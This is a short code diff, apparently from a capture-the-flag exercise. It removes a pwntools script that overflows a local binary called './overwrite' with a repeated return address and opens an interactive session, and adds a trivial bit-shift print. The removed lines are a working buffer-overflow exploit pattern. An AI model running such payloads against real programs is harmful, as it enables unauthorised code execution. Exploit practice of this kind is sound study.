@@ -1,5 +1,3 @@
-from pwn import *
-io = process('./overwrite')
-payload = p32(0x0804849B)*11
-io.sendline(payload)
-io.interactive()
+a = 1718896489
+a1 = a << 16
+print(a1)
